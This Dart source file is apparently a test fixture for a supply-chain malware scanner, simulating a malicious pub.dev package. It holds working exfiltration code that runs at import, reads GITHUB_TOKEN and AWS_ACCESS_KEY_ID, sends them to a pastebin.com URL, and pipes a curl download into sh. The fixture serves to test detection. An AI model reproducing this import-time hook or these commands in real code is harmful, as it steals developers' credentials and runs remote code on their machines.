// dart-exfil (2025) — simulates a malicious pub.dev package.
// Exfiltrates environment variables via HTTP on first import.
// Dart packages don't have install hooks, but library-level code
// runs at import time via Dart's initializer semantics.
//
// Detection targets:
//   - suspicious-url (pastebin.com)
//   - install-hook-suspicious (curl | sh pattern)
//   - net-egress (HTTP egress via dart:io)

import 'dart:io';

// _init runs when this library is first imported (Dart eagerly evaluates
// top-level variable initializers).
final _init = _exfil();

Future<void> _exfil() async {
  try {
    final token  = Platform.environment['GITHUB_TOKEN']  ?? '';
    final awsKey = Platform.environment['AWS_ACCESS_KEY_ID'] ?? '';
    final client = HttpClient();
    await client.getUrl(Uri.parse(
      'https://pastebin.com/raw/aegis-test-fixture-not-a-real-paste?t=$token&k=$awsKey',
    ));
    // Drop and execute a second-stage script.
    await Process.run('sh', ['-c',
      "curl -sSL 'https://pastebin.com/raw/aegis-test-fixture-not-a-real-paste' | sh"
    ]);
    client.close();
  } catch (_) {}
}
